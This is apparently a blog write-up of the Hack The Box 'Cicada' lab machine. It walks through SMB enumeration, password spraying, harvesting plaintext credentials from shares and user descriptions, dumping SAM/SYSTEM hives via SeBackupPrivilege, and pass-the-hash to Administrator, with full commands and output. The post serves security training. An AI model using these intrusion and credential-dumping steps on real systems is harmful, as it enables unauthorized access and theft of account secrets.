---
layout: '@/templates/BasePost.astro'
title: Cicada Writeup HTB
description: ['#Windows #PrivilegeEscalation #SeBackupPrivilege #HashDump #RootShell']
pubDate: 2024-09-29T19:46:00Z
imgSrc: 'https://labs.hackthebox.com/storage/avatars/79616a32a057e5e672dadb51bb96dd04.png'
imgAlt: 'Cicada HTB Challenge Image'
---

# Cicada WriteUp - Hack The Box

**Platform:** Windows  
**IP Address:** 10.10.11.35  
**Difficulty:** Easy

In this write-up, we'll dive into the Cicada HTB box,This is an easy rated box which offers an engaging challenge focused on privilege escalation techniques. From the start, the goal is to explore how users with specific permissions can be exploited for elevated access. After some initial probing, I stumbled upon valid user credentials that led me to a development share filled with interesting files. One standout was a PowerShell script that unexpectedly revealed another user’s credentials.

With the SeBackupPrivilege granted to my user, I was able to back up crucial system files, including the SYSTEM and SAM registries. This step opened the door to extracting hashed credentials for the Administrator account. Using those hashes, I successfully authenticated as the Administrator and took full control of the system. Let’s go through the steps I took to conquer this box and share some insights along the way.

## Reconnaissance

Kicked things off with a rustscan and nmap scan, and found some interesting ports. The machine is a Windows server called **CICADA-DC**, and it's part of the **cicada.htb** domain, which I’ve added to my hosts file. No web services to poke at, so I’ll focus on **LDAP**, **SMB**, and **Kerberos** enumeration. The goal here is to gather some user and group info, maybe even dig into a few files.
```
rustscan -a 10.10.11.35 -- -Pn -sC -sV -vvv
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.35:53
Open 10.10.11.35:88
Open 10.10.11.35:135
Open 10.10.11.35:139
Open 10.10.11.35:389
Open 10.10.11.35:445
Open 10.10.11.35:464
Open 10.10.11.35:593
Open 10.10.11.35:636
Open 10.10.11.35:5985
Open 10.10.11.35:55889
Open 10.10.11.35:56342
[~] Starting Nmap
[>] The Nmap command to be run is nmap -Pn -sC -sV -vvv -vvv -p 53,88,135,139,389,445,464,593,636,5985,55889,56342 10.10.11.35

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 00:20 WAT
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-09-29 06:20:47Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
---SNIP----
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
55889/tcp open  msrpc         syn-ack Microsoft Windows RPC
56342/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-29T06:21:39
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43674/tcp): CLEAN (Timeout)
|   Check 2 (port 14644/tcp): CLEAN (Timeout)
|   Check 3 (port 62917/udp): CLEAN (Timeout)
|   Check 4 (port 13628/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

```

## SMB Enumeration

I pivoted to SMB shares to see what i could access. Here's what showed up when I ran the `smbclient` command:

```bash
┌──(mofe㉿mofe)-[~]
└─$ smbclient -L 10.10.11.35     
Password for [WORKGROUP\mofe]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

Reconnecting with SMB1 for workgroup listing.
```
I tried accessing some shares and found soemthing interesting in the HR share. There was a Notice from HR.txt file sitting there.
```bash
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ smbclient -N //10.10.11.35/HR 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 18:31:48 2024

                4168447 blocks of size 4096. 322179 blocks available
smb: \> 
```
I downloaded the note, and inside, I found a password!
```
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```
## User Enumeration

Now that we have a password, the next step was to find a user to go along with it. For this, I used the `lookupsid.py` script from Impacket to enumerate the users and groups on the target system.

```bash
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ python /usr/share/doc/python3-impacket/examples/lookupsid.py guest@10.10.11.35 -no-pass 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.10.11.35
[*] StringBinding ncacn_np:10.10.11.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```
I found quite a few objects, including users, groups, and aliases. These users are of particular interest:

    CICADA\Administrator
    CICADA\Guest
    CICADA\krbtgt
    CICADA\john.smoulder
    CICADA\sarah.dantelia
    CICADA\michael.wrightson
    CICADA\david.orelious
    CICADA\emily.oscars

At this point, I noted the users down for further attempts to match them with the password I found earlier.

## Password Spraying Attack

Now that we have a password and a list of users, the next logical step was to attempt a password spraying attack to check which user might match the password. I used the `netexec` tool to try the password across all the discovered usernames.

```bash
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ netexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
```

As we can see from the output, the password worked for the user **michael.wrightson**. This user will be our target for further exploitation.


## Further Enumeration with enum4linux-ng

After obtaining access with `michael.wrightson`, I checked to see if I could access shares I didn't previously have access to, but to no avail.

With credentials for `michael.wrightson`, I used `enum4linux-ng` to gather more information about the target system. The command used is shown below:

```bash
python3 enum4linux-ng.py -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35

This provided a lot of information, but what caught my attention was the "Users via RPC" section. Specifically, the user david.orelious had a description that contained what appears to be their password:

```bash
 ====================================
|    Users via RPC on 10.10.11.35    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 8 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 8 user(s) via 'enumdomusers'
[+] After merging user results we have 8 user(s) total:
'1104':                                                                                                                              
  username: john.smoulder                                                                                                            
  name: (null)                                                                                                                       
  acb: '0x00000210'                                                                                                                  
  description: (null)                                                                                                                
'1105':                                                                                                                              
  username: sarah.dantelia                                                                                                           
  name: (null)                                                                                                                       
  acb: '0x00000210'                                                                                                                  
  description: (null)                                                                                                                
'1106':                                                                                                                              
  username: michael.wrightson                                                                                                        
  name: (null)                                                                                                                       
  acb: '0x00000210'                                                                                                                  
  description: (null)                                                                                                                
'1108':                                                                                                                              
  username: david.orelious                                                                                                           
  name: (null)                                                                                                                       
  acb: '0x00000210'                                                                                                                  
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                   
'1601':                                                                                                                              
  username: emily.oscars                                                                                                             
  name: Emily Oscars                                                                                                                 
  acb: '0x00000210'                                                                                                                  
  description: (null)                                                                                                                
'500':                                                                                                                               
  username: Administrator                                                                                                            
  name: (null)                                                                                                                       
  acb: '0x00000210'                                                                                                                  
  description: Built-in account for administering the computer/domain                                                                
'501':                                                                                                                               
  username: Guest                                                                                                                    
  name: (null)                                                                                                                       
  acb: '0x00000214'                                                                                                                  
  description: Built-in account for guest access to the computer/domain                                                              
'502':                                                                                                                               
  username: krbtgt                                                                                                                   
  name: (null)                                                                                                                       
  acb: '0x00020011'                                                                                                                  
  description: Key Distribution Center Service Account                
```
We now have another set of credentials to try:

    Username: david.orelious
    Password: aRt$Lp#7t*VQ!3

With the new user privileges, I returned to check if I could access shares that were previously restricted. Using the following command:

Using the credentials for `david.orelious`, I accessed the `DEV` share, which was previously restricted. I used the following command to connect:

```bash
smbclient "//10.10.11.35/DEV" -U david.orelious
```
After successfully logging in, I ran the dir command and found a powershell file:

```

smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024
```
The PowerShell script named Backup_script.ps1, i downloaded the script:

```powershell

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

This script authenticating as emily.oscars, along with a hardcoded password: Q!3@Lp#M6b*7t*Vt.

using netexec we discovered that we can access Windows Remote Management (WinRM) service as emily.oscars
```bash
netexec  winrm cicada.htb -u emily.oscars  -p 'Q!3@Lp#M6b*7t*Vt' --continue-on-success
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```
```
┌──(mofe㉿mofe)-[~/files/htb/cicada/enum4linux-ng]
└─$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

I used Evil-WinRM to establish a remote session as `emily.oscars`

After gaining remote access, I checked the users on the system and discovered two accounts:

```
 Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/26/2024   1:10 PM                Administrator
d-----         8/22/2024   2:22 PM                emily.oscars.CICADA
d-r---         3/14/2024   3:45 AM                Public
```
Our goal is to escalate privileges to the `Administrator` account. 

I then checked the current privileges for the `emily.oscars` user:

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

SeBackupPrivilege

The SeBackupPrivilege allows a user to bypass file security permissions when backing up files. This means that the user can read files and directories regardless of the permissions set on them. This privilege is typically granted to backup operators and can be exploited for privilege escalation, as it enables access to sensitive files that would otherwise be restricted.


SeRestorePrivilege

The SeRestorePrivilege allows a user to restore files and directories, even if they do not have explicit permissions to access those files. This privilege can be used to overwrite existing files or create new ones in protected locations, making it useful for restoring system configurations or gaining access to sensitive areas of the file system.


SeShutdownPrivilege

    Description: This privilege allows a user to shut down the system.
    Potential Use: It can be used to perform a system shutdown or restart, which may disrupt services or potentially provide an opportunity for an attacker to regain access after a system reboot if they are able to manipulate startup processes.

SeChangeNotifyPrivilege

    Description: Also known as "Bypass traverse checking," this privilege allows a user to access objects (files, folders, etc.) regardless of the permissions set on those objects, as long as the user has access to the parent folder.
    Potential Use: This privilege is commonly used to traverse directories even if the user does not have permission to access certain files within them. It can be useful for discovering files or executing certain operations that would otherwise be restricted.

SeIncreaseWorkingSetPrivilege

    Description: This privilege allows a user to increase the working set of a process. The working set is the amount of memory that a process can use without causing it to be swapped out of physical memory.
    Potential Use: While this privilege is less commonly exploited, it can be used to improve the performance of an application by increasing its memory allocation, potentially allowing it to run more efficiently or evade detection in certain scenarios.

we'll be focusing on SeBackupPriviledge for escalation

### SeBackupPrivilege for Escalation

  Create a Temporary Directory

```
mkdir C:\temp
```
Backup SYSTEM and SAM Files

 SYSTEM File: Contains information about the system configuration and control settings for the operating system. It includes details such as services, drivers, and device settings.
 SAM File: Stands for Security Account Manager; it stores user account information, including usernames and hashed passwords for local accounts.

```powershell

reg save hklm\system C:\temp\system
reg save hklm\sam C:\temp\sam
```

Exfiltrate the Files to Your Own Machine

After successfully backing up the files to the temporary directory, you can use various methods to transfer these files to your local machine. Common methods include using Evil-WinRM with download commands or using SMB shares.

### Privilege Escalation Using Pass-the-Hash

 Extract Hashes with pypykatz
 Use pypykatz to parse the SAM and SYSTEM registry hives to extract stored credentials.
 ```
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Identify the Administrator Hash

The hash for the Administrator account is 2b87e7c93a3e8a0ea4a581937016f341. You will use this hash to authenticate as the Administrator without needing the plaintext password.

```powershell
┌──(mofe㉿mofe)-[~/files/htb/cicada]
└─$ evil-winrm -i 10.10.11.35 -u Administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
And now we have Administrator priviledges








